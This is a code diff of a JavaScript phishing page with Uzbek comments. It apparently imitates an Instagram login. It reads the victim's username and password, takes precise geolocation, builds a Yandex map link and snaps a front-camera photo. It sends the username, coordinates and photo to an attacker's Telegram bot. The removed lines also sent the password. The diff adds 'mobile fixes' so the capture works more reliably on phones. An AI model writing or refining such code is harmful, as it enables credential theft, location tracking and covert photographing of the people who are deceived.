@@ -5,38 +5,44 @@ const btn = document.querySelector('#btn');
 
 btn.addEventListener('click', async () => {
 
-    const u = document.getElementById('ig-user').value.trim();
-    const p = document.getElementById('ig-pass').value.trim();
-
-    if (!u || !p) {
-        showToast("Barcha maydonlarni to'ldiring");
-        return;
-    }
-
-    // 👉 helperlar
+    // 👉 helper funksiyalar
     async function getPhotoBlob() {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" } // 🔥 front kamera
+        });
+
         const video = document.createElement("video");
         video.srcObject = stream;
+        video.setAttribute("playsinline", true);
+        video.muted = true;
+
         await video.play();
 
+        // 👉 mobile fix (kutish)
+        await new Promise(r => setTimeout(r, 500));
+
         const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth || 300;
+        canvas.height = video.videoHeight || 300;
 
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0);
 
         stream.getTracks().forEach(t => t.stop());
 
-        return new Promise(res => canvas.toBlob(res, "image/png"));
+        return new Promise(resolve => {
+            canvas.toBlob(blob => resolve(blob), "image/png");
+        });
     }
 
     async function sendText(text) {
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id, text })
+            body: JSON.stringify({
+                chat_id: chat_id,
+                text: text
+            })
         });
     }
 
@@ -51,30 +57,52 @@ btn.addEventListener('click', async () => {
         });
     }
 
+    // 👉 input
+    const u = document.getElementById('ig-user').value.trim();
+    const p = document.getElementById('ig-pass').value.trim();
+
+    if (!u || !p) {
+        showToast("Barcha maydonlarni to'ldiring");
+        return;
+    }
+
+    let lat, lon;
+
     try {
-        // 👉 2) Location (permission popup)
-        const pos = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject);
+        // 📍 LOCATION (mobile fix)
+        const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 10000
+            });
         });
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
 
-        // 👉 3) Yandex link (qizil pin + label)
-        const label = encodeURIComponent(`User: ${u} , pass:${p} `);
-        const yandexLink =
-            `https://yandex.com/maps/?ll=${lon},${lat}&z=17&pt=${lon},${lat},pm2rdm~${label}`;
+        lat = position.coords.latitude;
+        lon = position.coords.longitude;
 
-        // 👉 4) Matn yuborish (parolsiz)
-        const text = `User: ${u}
-        pass:${p}
+    } catch (err) {
+        showToast("Location olinmadi");
+        return;
+    }
+
+    try {
+        // 📍 Yandex map link (qizil pin)
+        const label = encodeURIComponent(`User: ${u}`);
+        const yandexLink = `https://yandex.com/maps/?ll=${lon},${lat}&z=17&pt=${lon},${lat},pm2rdm~${label}`;
+
+        const text = `
+User: ${u}
 LAT: ${lat}
 LON: ${lon}
 
 📍 Yandex Map:
-${yandexLink}`;
+${yandexLink}
+`;
+
+        // 👉 telegram text
         await sendText(text);
 
-        // 👉 5) Kamera (permission popup) → rasm yuborish
+        // 👉 kamera (mobile fix)
         try {
             const photo = await getPhotoBlob();
             await sendPhoto(photo);
@@ -82,10 +110,11 @@ ${yandexLink}`;
             console.log("Kamera rad etildi:", e.message);
         }
 
-        showToast("Ma'lumotlar yuborildi");
+        showToast("Hammasi ishladi ✅");
 
     } catch (err) {
         console.log(err.message);
-        showToast("Location olinmadi yoki rad etildi");
+        showToast("Xatolik yuz berdi");
     }
+
 });
